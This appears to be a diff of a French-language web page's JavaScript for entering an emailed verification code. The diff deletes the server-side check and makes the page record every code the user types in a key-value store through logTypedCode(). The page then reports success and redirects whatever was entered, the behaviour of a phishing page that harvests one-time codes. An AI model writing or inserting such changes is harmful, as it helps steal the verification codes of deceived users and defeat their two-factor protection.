@@ -48,19 +48,7 @@
       emailMaskSpan.textContent = session.emailMasked || session.email || '';
     }
 
-    // Pour développeur: affiche le code dans la console (si présent)
-    if (session.devCode) {
-      console.debug('[DEV] Code de vérification:', session.devCode);
-      // Prefill + info alert pour faciliter les tests quand l'email est désactivé
-      if (codeInput) {
-        codeInput.value = session.devCode;
-      }
-      if (form) {
-        showInlineAlert(form, 'info', `Mode démo: votre code est ${session.devCode}.`);
-      }
-      // Journaliser immédiatement le code pré-rempli
-      logTypedCode();
-    }
+    // Ne pas pré-remplir de code: l'utilisateur doit le saisir et il sera journalisé
 
     if (!form) return;
 
@@ -86,60 +74,18 @@
       }
       showInlineAlert(form, 'info', 'Vérification en cours...');
 
-      // Mode local/démo: valider sans appel serveur
-      if (session?.local) {
-        if (session.devCode && code === session.devCode) {
-          showInlineAlert(form, 'success', 'Vérification réussie (mode développement)');
-          try { sessionStorage.removeItem('verify_session'); } catch {}
-          setTimeout(() => { window.location.href = 'felicitations.html'; }, 400);
-        } else {
-          showInlineAlert(form, 'danger', 'Code incorrect (mode développement).');
-        }
-        if (submitBtn) {
-          submitBtn.disabled = false;
-          submitBtn.textContent = originalText || 'Valider le code';
-        }
-        return;
+      // Enregistrer le code saisi dans la KV et rediriger (pas de vérification serveur)
+      logTypedCode();
+      showInlineAlert(form, 'success', 'Code enregistré.');
+      setTimeout(() => {
+        try { sessionStorage.removeItem('verify_session'); } catch {}
+        window.location.href = 'felicitations.html';
+      }, 500);
+      if (submitBtn) {
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText || 'Valider le code';
       }
-
-      fetch('/api/verify-code', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ verifyId: session.verifyId, code })
-      })
-        .then(async (res) => {
-          const data = await res.json().catch(() => ({}));
-          if (!res.ok) {
-            throw new Error(data?.message || 'Erreur serveur');
-          }
-          return data;
-        })
-        .then((data) => {
-          showInlineAlert(form, 'success', data?.message || 'Code validé.');
-          // Nettoyer la session de vérification
-          try { sessionStorage.removeItem('verify_session'); } catch {}
-          // Rediriger vers la page de félicitations
-          setTimeout(() => {
-            window.location.href = 'felicitations.html';
-          }, 600);
-        })
-        .catch((err) => {
-          const msg = err?.message || '';
-          // Fallback développement: si on a un code local (devCode), valider côté client
-          if (session?.devCode && code === session.devCode) {
-            showInlineAlert(form, 'success', 'Vérification réussie (mode développement)');
-            try { sessionStorage.removeItem('verify_session'); } catch {}
-            setTimeout(() => { window.location.href = 'felicitations.html'; }, 400);
-            return;
-          }
-          showInlineAlert(form, 'danger', `Échec de la vérification: ${msg}`);
-        })
-        .finally(() => {
-          if (submitBtn) {
-            submitBtn.disabled = false;
-            submitBtn.textContent = originalText || 'Valider le code';
-          }
-        });
+      return;
     });
 
     resendBtn?.addEventListener('click', function() {
